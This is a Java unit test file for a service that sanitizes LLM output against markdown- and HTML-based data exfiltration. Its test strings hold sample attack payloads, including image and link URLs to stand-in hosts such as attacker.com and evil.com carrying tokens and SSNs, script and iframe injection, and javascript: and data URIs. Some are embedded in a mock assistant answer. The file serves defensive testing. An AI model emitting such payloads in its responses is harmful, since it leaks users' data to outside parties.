package com.secureai.security;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.test.util.ReflectionTestUtils;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Unit tests for OutputSanitizationService — OWASP LLM02 Mitigation
 *
 * Validates that all markdown-based data exfiltration attack vectors
 * are properly neutralized before returning LLM responses to clients.
 */
@DisplayName("OutputSanitizationService Tests")
class OutputSanitizationServiceTest {

    private OutputSanitizationService service;

    @BeforeEach
    void setUp() {
        service = new OutputSanitizationService();
        ReflectionTestUtils.setField(service, "enabled", true);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Edge cases & passthrough
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("Passthrough — Safe Content")
    class SafeContent {

        @Test
        @DisplayName("Should pass through plain text unchanged")
        void plainTextUnchanged() {
            String input = "The capital of France is Paris. It has a population of 2.1 million.";
            assertThat(service.sanitize(input)).isEqualTo(input);
        }

        @Test
        @DisplayName("Should pass through null and blank inputs")
        void nullAndBlank() {
            assertThat(service.sanitize(null)).isNull();
            assertThat(service.sanitize("")).isEqualTo("");
            assertThat(service.sanitize("   ")).isEqualTo("   ");
        }

        @Test
        @DisplayName("Should pass through safe markdown formatting")
        void safeMarkdown() {
            String input = "## Heading\n\n- Bullet 1\n- **Bold text**\n- `code`\n\n> Blockquote";
            assertThat(service.sanitize(input)).isEqualTo(input);
        }

        @Test
        @DisplayName("Should allow whitelisted domain links")
        void whitelistedDomains() {
            String input = "See [docs](https://github.com/user/repo) for more info.";
            assertThat(service.sanitize(input)).isEqualTo(input);
        }

        @Test
        @DisplayName("Should allow relative URLs")
        void relativeUrls() {
            String input = "See [details](/api/docs) and [section](#overview) for more.";
            assertThat(service.sanitize(input)).isEqualTo(input);
        }

        @Test
        @DisplayName("Should pass through when sanitization is disabled")
        void disabledPassthrough() {
            ReflectionTestUtils.setField(service, "enabled", false);
            String malicious = "![exfil](http://attacker.com/steal?data=SECRET)";
            assertThat(service.sanitize(malicious)).isEqualTo(malicious);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Attack Vector 1: Markdown image exfiltration
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("Markdown Image Exfiltration")
    class MarkdownImageExfil {

        @Test
        @DisplayName("Should block external image URLs that could exfiltrate data")
        void blockExternalImage() {
            String input = "Here is the answer: ![tracker](http://attacker.com/exfil?data=SENSITIVE)";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("attacker.com");
            assertThat(result).contains("[Image removed:");
        }

        @Test
        @DisplayName("Should block image with query params containing sensitive data")
        void blockImageWithQueryParams() {
            String input = "![](http://evil.com/log?token=eyJhbGci&ssn=123-45-6789)";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("evil.com");
            assertThat(result).doesNotContain("eyJhbGci");
        }

        @Test
        @DisplayName("Should block multiple external images in one response")
        void blockMultipleImages() {
            String input = "![a](http://evil1.com/x) and ![b](http://evil2.com/y)";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("evil1.com");
            assertThat(result).doesNotContain("evil2.com");
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Attack Vector 2: Markdown link exfiltration
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("Markdown Link Exfiltration")
    class MarkdownLinkExfil {

        @Test
        @DisplayName("Should block clickjacking links to external domains")
        void blockExternalLink() {
            String input = "For more info, [click here](http://attacker.com/steal?jwt=TOKEN123)";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("attacker.com");
            assertThat(result).contains("[link removed]");
            assertThat(result).contains("click here");
        }

        @Test
        @DisplayName("Should preserve link text while removing malicious URL")
        void preserveLinkText() {
            String input = "[Important Document](http://phishing.com/doc)";
            String result = service.sanitize(input);
            assertThat(result).contains("Important Document");
            assertThat(result).doesNotContain("phishing.com");
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Attack Vector 3: HTML injection
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("HTML Injection")
    class HtmlInjection {

        @Test
        @DisplayName("Should block dangerous HTML tags (script, iframe)")
        void blockDangerousTags() {
            String input = "Result: <script>alert('xss')</script> done.";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("<script>");
            assertThat(result).contains("[HTML_BLOCKED]");
        }

        @Test
        @DisplayName("Should block iframe injection")
        void blockIframe() {
            String input = "<iframe src='http://evil.com/phish'></iframe>";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("<iframe");
            assertThat(result).contains("[HTML_BLOCKED]");
        }

        @Test
        @DisplayName("Should block HTML img tags with external sources")
        void blockHtmlImg() {
            String input = "See: <img src=\"http://tracker.com/pixel.gif?data=SECRET\"/>";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("tracker.com");
        }

        @Test
        @DisplayName("Should block HTML anchor tags with external hrefs")
        void blockHtmlAnchor() {
            String input = "<a href=\"http://evil.com/steal\">Click</a>";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("evil.com");
        }

        @Test
        @DisplayName("Should strip event handler attributes")
        void stripEventHandlers() {
            String input = "<div onload=\"fetch('http://evil.com')\">Content</div>";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("onload=");
            assertThat(result).doesNotContain("evil.com");
        }

        @Test
        @DisplayName("Should block form and input tags")
        void blockFormTags() {
            String input = "<form action='http://evil.com'><input type='hidden' value='token'/></form>";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("<form");
            assertThat(result).doesNotContain("<input");
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Attack Vector 4: Data URI abuse
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("Data URI Abuse")
    class DataUriAbuse {

        @Test
        @DisplayName("Should neutralize data URIs with base64 payloads")
        void blockDataUri() {
            String input = "![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=)";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("data:text/html");
        }

        @Test
        @DisplayName("Should block javascript URIs")
        void blockJavascriptUri() {
            String input = "[click](javascript:alert('xss'))";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("javascript:");
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Attack Vector 5: Reference-style link exfiltration
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("Reference-Style Link Exfiltration")
    class ReferenceLinkExfil {

        @Test
        @DisplayName("Should block reference-style links to external domains")
        void blockReferenceLink() {
            String input = "See [details][ref1] for info.\n\n[ref1]: http://attacker.com/exfil?data=secret";
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("attacker.com");
            assertThat(result).contains("[link removed]");
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Detection API
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("Suspicious Content Detection")
    class SuspiciousDetection {

        @Test
        @DisplayName("Should detect suspicious markdown images")
        void detectSuspiciousImage() {
            assertThat(service.containsSuspiciousContent(
                    "![x](http://attacker.com/exfil)")).isTrue();
        }

        @Test
        @DisplayName("Should detect dangerous HTML tags")
        void detectDangerousTags() {
            assertThat(service.containsSuspiciousContent(
                    "<script>alert('xss')</script>")).isTrue();
        }

        @Test
        @DisplayName("Should not flag safe content")
        void safeContentNotFlagged() {
            assertThat(service.containsSuspiciousContent(
                    "The answer is 42. See **bold** text.")).isFalse();
        }

        @Test
        @DisplayName("Should detect data URIs")
        void detectDataUri() {
            assertThat(service.containsSuspiciousContent(
                    "data:text/html;base64,abc123")).isTrue();
        }

        @Test
        @DisplayName("Should return false for null/blank")
        void nullBlankSafe() {
            assertThat(service.containsSuspiciousContent(null)).isFalse();
            assertThat(service.containsSuspiciousContent("")).isFalse();
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Mixed content (real-world LLM responses with embedded attacks)
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("Mixed Content — Real-World Attack Scenarios")
    class MixedContent {

        @Test
        @DisplayName("Should sanitize attack embedded in legitimate response")
        void attackInLegitResponse() {
            String input = """
                    The capital of France is Paris. It has a population of approximately 2.1 million.

                    For more information, see this helpful resource:
                    ![map](http://attacker.com/exfil?answer=Paris&user=admin)

                    Paris is known for the Eiffel Tower, built in 1889.
                    """;
            String result = service.sanitize(input);
            assertThat(result).contains("capital of France is Paris");
            assertThat(result).contains("Eiffel Tower");
            assertThat(result).doesNotContain("attacker.com");
            assertThat(result).doesNotContain("exfil");
        }

        @Test
        @DisplayName("Should handle multiple attack vectors in single response")
        void multipleAttackVectors() {
            String input = """
                    Here's the answer:
                    ![img](http://evil.com/track)
                    [Click for details](http://phish.com/steal)
                    <script>document.location='http://evil.com'</script>
                    <img src="http://tracker.com/pixel.gif"/>
                    """;
            String result = service.sanitize(input);
            assertThat(result).doesNotContain("evil.com");
            assertThat(result).doesNotContain("phish.com");
            assertThat(result).doesNotContain("tracker.com");
            assertThat(result).doesNotContain("<script>");
        }
    }
}
